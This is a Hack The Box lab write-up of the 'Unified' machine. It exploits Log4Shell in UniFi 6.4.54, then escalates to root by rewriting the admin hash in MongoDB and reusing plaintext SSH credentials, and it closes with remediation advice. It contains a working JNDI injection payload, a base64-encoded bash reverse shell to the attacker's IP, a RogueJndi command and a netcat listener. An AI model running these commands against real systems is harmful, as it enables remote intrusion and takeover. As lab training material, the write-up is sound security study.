@@ -1,0 +1,356 @@
+# HTB Unified — Writeup
+
+**Difficulty:** Easy
+**Platform:** Hack The Box
+**Category:** Linux / Web Exploitation / Privilege Escalation
+
+## Executive Summary
+
+Unified is an Easy-rated Linux machine centered around **UniFi Network Controller v6.4.54**, which ships a vulnerable version of Log4j and is susceptible to **Log4Shell (CVE-2021-44228)**. Exploiting this flaw grants remote code execution as the `unifi` service user. From there, direct access to the application's local **MongoDB** instance allows an attacker to overwrite the administrator's password hash, log into the UniFi dashboard, and recover plaintext root SSH credentials stored in the application settings — leading to full root compromise.
+
+**Technologies involved:**
+- Apache Tomcat
+- UniFi Network Controller
+- Log4j (Log4Shell)
+- MongoDB
+
+**Attack chain:**
+
+```
+Nmap Enumeration
+      │
+      ▼
+UniFi 6.4.54 Discovery
+      │
+      ▼
+Research → Log4Shell (CVE-2021-44228)
+      │
+      ▼
+Remote Code Execution
+      │
+      ▼
+Reverse Shell as unifi
+      │
+      ▼
+MongoDB Enumeration
+      │
+      ▼
+Replace Administrator Password Hash
+      │
+      ▼
+Login to UniFi Dashboard
+      │
+      ▼
+Recover Root SSH Credentials
+      │
+      ▼
+SSH as root
+```
+
+---
+
+## 1. Enumeration
+
+As always, the first step is identifying the available attack surface. A standard Nmap service scan is usually enough to reveal what's exposed and where to start looking.
+
+```bash
+nmap -sC -sV 10.129.96.149
+```
+
+| Port | Service | Observation |
+|------|---------|-------------|
+| 22   | SSH     | OpenSSH 8.2p1 on Ubuntu. Not immediately useful without credentials, but worth revisiting later. |
+| 6789 | Unknown | Fingerprinted by Nmap as `ibm-db2-admin?`. No obvious attack surface, set aside for now. |
+| 8080 | HTTP    | Apache Tomcat, immediately redirects to the management interface on 8443. |
+| 8443 | HTTPS   | UniFi Network Controller login page — the application's primary interface, and the most promising target. |
+
+Since SSH requires credentials I don't yet have, the web application — accessible to anyone — is the logical starting point.
+
+### Web Application Enumeration
+
+Browsing to:
+
+```
+http://10.129.96.149:8080
+```
+
+redirects automatically to:
+
+```
+https://10.129.96.149:8443/manage/account/login
+```
+
+The login page discloses the exact software and version: **UniFi Network Controller 6.4.54**.
+
+Whenever an application's exact version is exposed, it's worth checking for known CVEs before attempting brute force or manual testing — version numbers are often the fastest path to a foothold. A quick search for "UniFi 6.4.54 vulnerabilities" points directly to **Log4Shell (CVE-2021-44228)**, since this version bundles a vulnerable Log4j release.
+
+---
+
+## 2. Understanding the Vulnerability
+
+Before exploiting it blindly, it's worth understanding *why* Log4Shell works.
+
+Log4Shell abuses the **JNDI (Java Naming and Directory Interface)** lookup feature built into Log4j. When a vulnerable application logs unsanitized user input, a specially crafted string such as:
+
+```
+${jndi:ldap://localhost:1389/Test}
+```
+
+is not treated as a literal string. Instead, Log4j evaluates it as a JNDI lookup and reaches out to the attacker-controlled LDAP server referenced in the payload. If that server returns a malicious object reference, the vulnerable application executes the attacker's code.
+
+At a high level:
+
+```
+Attacker
+    │
+    ▼
+Inject JNDI payload
+    │
+    ▼
+Vulnerable Log4j Library
+    │
+    ▼
+Attacker-Controlled LDAP Server
+    │
+    ▼
+Malicious Java Object Returned
+    │
+    ▼
+Remote Code Execution
+```
+
+### Locating the Injection Point
+
+To see how the application handled authentication, I intercepted a login request in Burp Suite and sent it to Repeater. The request body looked like this:
+
+```json
+{
+    "username": "asdf",
+    "password": "asdf",
+    "remember": false,
+    "strict": true
+}
+```
+
+Research into this UniFi version indicated that the `remember` parameter is processed by the vulnerable Log4j component, making it a suitable injection point for testing JNDI payloads.
+
+---
+
+## 3. Initial Access
+
+### Preparing the Attack Infrastructure
+
+First, confirm the VPN interface address so the target can call back:
+
+```bash
+ip a | grep tun0
+```
+
+Next, stand up an LDAP server capable of responding to JNDI lookups. I used the open-source **RogueJndi** project, which is purpose-built for researching Log4Shell in a lab environment:
+
+```bash
+git clone https://github.com/veracode-research/rogue-jndi
+cd rogue-jndi
+mvn package
+```
+
+The reverse shell command needs to be base64-encoded before being embedded in the JNDI payload:
+
+```bash
+echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.49/4444 0>&1"' | base64
+# YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OS80NDQ0IDA+JjEi
+```
+
+Then launch RogueJndi with a command that decodes and executes that payload:
+
+```bash
+java -jar rogue-jndi/target/RogueJndi-1.1.jar \
+  --command "bash -c {echo,YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40OS80NDQ0IDA+JjEi}|{base64,-d}|{bash,-i}" \
+  --hostname "10.10.14.49"
+```
+
+And a listener to catch the callback:
+
+```bash
+nc -lvnp 4444
+```
+
+### Triggering the Vulnerability
+
+In Burp Suite Repeater, I replaced the `remember` field value with a JNDI reference pointing at my LDAP server:
+
+```json
+"remember": "${jndi:ldap://10.10.14.49:1389/o=tomcat}"
+```
+
+When the request was sent, the vulnerable Log4j component evaluated the expression instead of treating it as a literal string, triggering an outbound LDAP lookup to my server — which in turn caused the target to execute the embedded command.
+
+A callback on the listener confirmed success:
+
+```
+unifi@unified:/usr/lib/unifi$
+```
+
+The shell displayed the usual signs of a non-interactive TTY (`cannot set terminal process group`, `no job control in this shell`), but it was fully functional for further enumeration.
+
+---
+
+## 4. Post-Exploitation Enumeration
+
+Confirming the execution context:
+
+```bash
+$ whoami
+unifi
+$ id
+uid=999(unifi) gid=999(unifi) groups=999(unifi)
+```
+
+Since the shell runs as the `unifi` service account, application files, configs, and databases owned by UniFi are all fair game. Rather than jumping straight to privilege escalation techniques, I enumerated the installation directory first — applications frequently store credentials and databases within their own directory structure.
+
+```bash
+$ ls -la /usr/lib/unifi
+drwxr-xr-x 1 unifi unifi  4096 bin
+lrwxrwxrwx 1 root  root     11 data -> /unifi/data
+drwxr-xr-x 3 unifi unifi  4096 dl
+drwxr-xr-x 3 unifi unifi 12288 lib
+lrwxrwxrwx 1 root  root     10 logs -> /unifi/log
+drwxr-xr-x 3 unifi unifi  4096 webapps
+```
+
+The `data` symlink pointing to `/unifi/data` stood out immediately as worth investigating for a database.
+
+A look at `/home` also revealed the user flag:
+
+```bash
+$ cat /home/michael/user.txt
+6ced1a6a89e666c0620cdb10262ba127
+```
+
+And `/etc/passwd` confirmed a local `mongodb` service account exists — consistent with UniFi's known use of MongoDB for its backend:
+
+```
+unifi:x:999:999::/home/unifi:/bin/sh
+mongodb:x:101:102::/var/lib/mongodb:/usr/sbin/nologin
+```
+
+---
+
+## 5. Privilege Escalation
+
+### MongoDB Enumeration
+
+UniFi stores its data in a local MongoDB instance. Since the compromised `unifi` account owns the data directory, I connected directly:
+
+```bash
+$ which mongo
+/usr/bin/mongo
+$ mongo --port 27117
+```
+
+```
+> show dbs
+ace       0.002GB
+ace_stat  0.000GB
+admin     0.000GB
+config    0.000GB
+local     0.000GB
+
+> use ace
+> show collections
+account
+admin
+...
+user
+...
+```
+
+The `admin` collection in the `ace` database holds UniFi's own administrator accounts:
+
+```javascript
+db.admin.find().pretty()
+{
+    "_id": ObjectId("61ce278f46e0fb0012d47ee4"),
+    "name": "administrator",
+    "email": "administrator@unified.htb",
+    "x_shadow": "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+    "time_created": NumberLong(1640900495),
+    ...
+}
+```
+
+### Overwriting the Admin Password Hash
+
+The natural first instinct is to crack `x_shadow` — a SHA-512 crypt hash. But cracking is slow and not guaranteed. Since I already have **write access to the database itself**, there's a much faster path: generate my own hash for a password I choose, and overwrite the stored value directly.
+
+Using `mkpasswd` to generate a SHA-512 crypt hash for a known password:
+
+```bash
+$ mkpasswd -m sha-512 password123
+$6$w0QGWY0ZwOKkdC8O$RD3ZNmbc.tNWVP6gXIDu2BYX6pU169wEpS6.1E1hgzkywJEWFsQSdrFKqMZVt3ajAzx.aADlpKr4DMW26vJ0H0
+```
+
+Then updating the document in MongoDB:
+
+```javascript
+db.admin.update(
+  { name: "administrator" },
+  { $set: { x_shadow: "$6$w0QGWY0ZwOKkdC8O$RD3ZNmbc.tNWVP6gXIDu2BYX6pU169wEpS6.1E1hgzkywJEWFsQSdrFKqMZVt3ajAzx.aADlpKr4DMW26vJ0H0" } }
+)
+WriteResult({ "nMatched": 1, "nUpserted": 0, "nModified": 1 })
+```
+
+### Logging into the UniFi Dashboard
+
+With the hash overwritten, I logged into the UniFi web UI at `https://10.129.96.149:8443` using:
+
+```
+administrator : password123
+```
+
+This granted full access to the controller dashboard.
+
+### Recovering Root Credentials
+
+Browsing the controller's **Settings** page revealed the SSH credentials for the underlying host stored in plaintext, presumably configured there for device adoption purposes:
+
+```
+root : NotACrackablePassword4U2022
+```
+
+### Root via SSH
+
+Recalling that port 22 was open in the initial Nmap scan, I used these credentials directly:
+
+```bash
+$ ssh root@10.129.96.149
+root@10.129.96.149's password:
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+
+root@unified:~# cat root.txt
+e50bc93c75b634e4b272d2f771c33681
+```
+
+Root access obtained.
+
+---
+
+## 6. Conclusion & Lessons Learned
+
+Unified is a solid, realistic example of how a single unpatched third-party dependency (Log4j) can cascade into full host compromise — even when the vulnerable application itself has no direct database credential exposure. Key takeaways:
+
+- **Version disclosure is a gift to attackers.** The UniFi login page exposing its exact version number turned a 10-minute recon step into a full RCE chain via a well-documented CVE.
+- **Log4Shell's danger comes from ubiquity.** The vulnerability doesn't need a dedicated "logging" feature — any user-controlled input that reaches a Log4j `log()` call is a potential injection point, which is why the `remember` field was exploitable here.
+- **Database write access is often more valuable than database read access.** Rather than trying to crack a strong SHA-512 crypt hash, direct write access to MongoDB allowed a much faster path to admin: replace the hash outright.
+- **Plaintext credentials in application settings are a recurring theme** in real-world misconfigurations — storing root SSH credentials inside the UniFi controller's settings page for device adoption is convenient for admins, but catastrophic if the controller itself is compromised.
+
+**Remediation recommendations:**
+1. Patch Log4j to a non-vulnerable version (>= 2.17.1) or upgrade UniFi Network Controller to a patched release.
+2. Avoid exposing exact software version numbers on unauthenticated login pages.
+3. Restrict local MongoDB access and enable authentication, even for localhost-bound instances.
+4. Avoid storing plaintext SSH credentials within application configuration/settings pages.
+5. Apply network segmentation so the management interface (8443) isn't broadly reachable.
+
+---
+
+*Writeup by Majda Sassi/AetherRaven2412 — completed as part of Hack The Box practice.*
